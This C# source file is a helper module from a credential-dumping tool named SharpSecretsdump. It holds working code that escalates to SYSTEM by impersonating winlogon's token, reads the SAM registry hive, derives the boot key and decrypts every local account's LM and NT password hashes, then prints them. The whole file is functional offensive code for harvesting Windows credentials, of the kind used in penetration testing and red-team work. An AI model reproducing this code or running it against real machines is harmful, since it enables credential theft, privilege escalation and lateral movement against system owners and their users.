using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace SharpSecretsdump
{
    public static class Helpers
    {
        public static bool GetSystem()
        {
            // helper to elevate to SYSTEM via token impersonation
            //  used for LSA secret (DPAPI_SYSTEM) retrieval
            if (IsHighIntegrity())
            {
                IntPtr hToken = IntPtr.Zero;

                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy of the token with DuplicateToken
                Process[] processes = Process.GetProcessesByName("winlogon");
                IntPtr handle = processes[0].Handle;

                // TOKEN_DUPLICATE = 0x0002
                bool success = Interop.OpenProcessToken(handle, 0x0002, out hToken);
                if (!success)
                {
                    //Console.WriteLine("OpenProcessToken failed!");
                    return false;
                }

                // make a copy of the NT AUTHORITY\SYSTEM token from winlogon
                // 2 == SecurityImpersonation
                IntPtr hDupToken = IntPtr.Zero;
                success = Interop.DuplicateToken(hToken, 2, ref hDupToken);
                if (!success)
                {
                    //Console.WriteLine("DuplicateToken failed!");
                    return false;
                }

                success = Interop.ImpersonateLoggedOnUser(hDupToken);
                if (!success)
                {
                    //Console.WriteLine("ImpersonateLoggedOnUser failed!");
                    return false;
                }

                // clean up the handles we created
                Interop.CloseHandle(hToken);
                Interop.CloseHandle(hDupToken);

                string name = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                if (name != "NT AUTHORITY\\SYSTEM")
                {
                    return false;
                }

                return true;
            }
            else
            {
                return false;
            }
        }

        public static byte[] GetHashedBootKey(byte[] bootKey, byte[] fVal)
        {
            byte[] domainData = fVal.Skip(104).ToArray();
            byte[] hashedBootKey;

            //old style hashed bootkey storage
            if (domainData[0].Equals(0x01))
            {
                byte[] f70 = fVal.Skip(112).Take(16).ToArray();
                List<byte> data = new List<byte>();
                data.AddRange(f70);
                data.AddRange(Encoding.ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"));
                data.AddRange(bootKey);
                data.AddRange(Encoding.ASCII.GetBytes("0123456789012345678901234567890123456789\0"));
                byte[] md5 = MD5.Create().ComputeHash(data.ToArray());
                byte[] f80 = fVal.Skip(128).Take(32).ToArray();
                hashedBootKey = Crypto.RC4Encrypt(md5, f80);
            }

            //new version of storage -- Win 2016 / Win 10 (potentially Win 2012) and above
            else if (domainData[0].Equals(0x02))
            {
                byte[] sk_Salt_AES = domainData.Skip(16).Take(16).ToArray();
                int sk_Data_Length = BitConverter.ToInt32(domainData, 12);
                // int offset = BitConverter.ToInt32(v,12) + 204;
                byte[] sk_Data_AES = domainData.Skip(32).Take(sk_Data_Length).ToArray();
                hashedBootKey = Crypto.DecryptAES_CBC(sk_Data_AES, bootKey, sk_Salt_AES);
            }
            else
            {
                Console.WriteLine("[-] Error parsing hashed bootkey");
                return null;
            }
            return hashedBootKey;
        }

        public static void GetSamAccounts(byte[] bootkey)
        {
            Console.WriteLine("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)");
            byte[] fVal = GetRegKeyValue("SAM\\Sam\\Domains\\Account", "F");
            byte[] hashedBootKey = GetHashedBootKey(bootkey, fVal);
            byte[] antpassword = Encoding.ASCII.GetBytes("NTPASSWORD\0");
            byte[] almpassword = Encoding.ASCII.GetBytes("LMPASSWORD\0");

            IntPtr hKey = IntPtr.Zero;
            IntPtr dummy = IntPtr.Zero;
            String keyPath = "SAM\\Sam\\Domains\\Account\\Users";
            StringBuilder classVal = new StringBuilder(1024);
            int len = 1024;
            int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
            IntPtr number = IntPtr.Zero;
            result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref dummy, ref number, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
            if (result != 0)
            {
                int error = Marshal.GetLastWin32Error();
                string errorMessage = new Win32Exception((int)error).Message;
                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
                Environment.Exit(0);
            }

            // length - 2 because . and .. ?
            for (int i = 0; i < number.ToInt32() - 2; i++)
            {
                len = 255;
                result = Interop.RegEnumKeyEx(hKey, i, classVal, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref dummy);
                if (result != 0)
                {
                    int error = Marshal.GetLastWin32Error();
                    string errorMessage = new Win32Exception((int)error).Message;
                    Console.WriteLine("Error enumeratingwqdqw {0} ({1}) : {2}", keyPath, error, errorMessage);
                    Environment.Exit(0);
                }

                if (classVal.ToString().StartsWith("000"))
                {
                    byte[] rid = BitConverter.GetBytes(System.Int32.Parse(classVal.ToString(), System.Globalization.NumberStyles.HexNumber));
                    byte[] v = GetRegKeyValue($"{keyPath}\\{classVal}", "V");
                    int offset = BitConverter.ToInt32(v, 12) + 204;
                    int length = BitConverter.ToInt32(v, 16);
                    string username = Encoding.Unicode.GetString(v.Skip(offset).Take(length).ToArray());

                    //there are 204 bytes of headers / flags prior to data in the encrypted key data structure
                    int lmHashOffset = BitConverter.ToInt32(v, 156) + 204;
                    int lmHashLength = BitConverter.ToInt32(v, 160);
                    int ntHashOffset = BitConverter.ToInt32(v, 168) + 204;
                    int ntHashLength = BitConverter.ToInt32(v, 172);
                    string lmHash = "aad3b435b51404eeaad3b435b51404ee";
                    string ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";

                    //old style hashes
                    if (v[ntHashOffset + 2].Equals(0x01))
                    {
                        IEnumerable<byte> lmKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(almpassword);
                        byte[] lmHashDecryptionKey = MD5.Create().ComputeHash(lmKeyParts.ToArray());
                        IEnumerable<byte> ntKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(antpassword);
                        byte[] ntHashDecryptionKey = MD5.Create().ComputeHash(ntKeyParts.ToArray());
                        byte[] encryptedLmHash = null;
                        byte[] encryptedNtHash = null;

                        if (ntHashLength == 20)
                        {
                            encryptedNtHash = v.Skip(ntHashOffset + 4).Take(16).ToArray();
                            byte[] obfuscatedNtHashTESTING = Crypto.RC4Encrypt(ntHashDecryptionKey, encryptedNtHash);
                            ntHash = Crypto.DecryptSingleHash(obfuscatedNtHashTESTING, classVal.ToString()).Replace("-", "");
                        }
                        if (lmHashLength == 20)
                        {
                            encryptedLmHash = v.Skip(lmHashOffset + 4).Take(16).ToArray();
                            byte[] obfuscatedLmHashTESTING = Crypto.RC4Encrypt(lmHashDecryptionKey, encryptedLmHash);
                            lmHash = Crypto.DecryptSingleHash(obfuscatedLmHashTESTING, classVal.ToString()).Replace("-", "");
                        }
                    }
                    //new-style hashes
                    else
                    {
                        byte[] enc_LM_Hash = v.Skip(lmHashOffset).Take(lmHashLength).ToArray();
                        byte[] lmData = enc_LM_Hash.Skip(24).ToArray();
                        //if a hash exists, otherwise we have to return the default string val
                        if (lmData.Length > 0)
                        {
                            byte[] lmHashSalt = enc_LM_Hash.Skip(8).Take(16).ToArray();
                            byte[] desEncryptedHash = Crypto.DecryptAES_CBC(lmData, hashedBootKey.Take(16).ToArray(), lmHashSalt).Take(16).ToArray();
                            lmHash = Crypto.DecryptSingleHash(desEncryptedHash, classVal.ToString()).Replace("-", "");
                        }

                        byte[] enc_NT_Hash = v.Skip(ntHashOffset).Take(ntHashLength).ToArray();
                        byte[] ntData = enc_NT_Hash.Skip(24).ToArray();
                        //if a hash exists, otherwise we have to return the default string val
                        if (ntData.Length > 0)
                        {
                            byte[] ntHashSalt = enc_NT_Hash.Skip(8).Take(16).ToArray();
                            byte[] desEncryptedHash = Crypto.DecryptAES_CBC(ntData, hashedBootKey.Take(16).ToArray(), ntHashSalt).Take(16).ToArray();
                            ntHash = Crypto.DecryptSingleHash(desEncryptedHash, classVal.ToString()).Replace("-", "");
                        }
                    }
                    string ridStr = System.Int32.Parse(classVal.ToString(), System.Globalization.NumberStyles.HexNumber).ToString();
                    string hashes = (lmHash + ":" + ntHash);
                    Console.WriteLine(string.Format("{0}:{1}:{2}", username, ridStr, hashes.ToLower()));
                }
            }
        }

        public static byte[] GetRegKeyValue(string keyPath, string valueName = null)
        {
            // takes a given HKLM key path and returns the registry value

            int result = 0;
            IntPtr hKey = IntPtr.Zero;

            // open the specified key with read (0x19) privileges
            //  0x80000002 == HKLM
            result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
            if (result != 0)
            {
                int error = Marshal.GetLastWin32Error();
                string errorMessage = new Win32Exception((int)error).Message;
                Console.WriteLine("Error opening {0} ({1}) : {2}", keyPath, error, errorMessage);
                return null;
            }

            int cbData = 0;
            result = Interop.RegQueryValueEx(hKey, valueName, 0, IntPtr.Zero, IntPtr.Zero, ref cbData);
            if (result != 0)
            {
                int error = Marshal.GetLastWin32Error();
                string errorMessage = new Win32Exception((int)error).Message;
                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
                return null;
            }

            IntPtr dataPtr = Marshal.AllocHGlobal(cbData);
            result = Interop.RegQueryValueEx(hKey, valueName, 0, IntPtr.Zero, dataPtr, ref cbData);
            if (result != 0)
            {
                int error = Marshal.GetLastWin32Error();
                string errorMessage = new Win32Exception((int)error).Message;
                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
                return null;
            }
            byte[] data = new byte[cbData];

            Marshal.Copy(dataPtr, data, 0, cbData);
            Interop.RegCloseKey(hKey);

            return data;
        }

        public static byte[] StringToByteArray(string hex)
        {
            // helper to convert a string hex representation to a byte array
            // yes, I know this inefficient :)
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context

            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
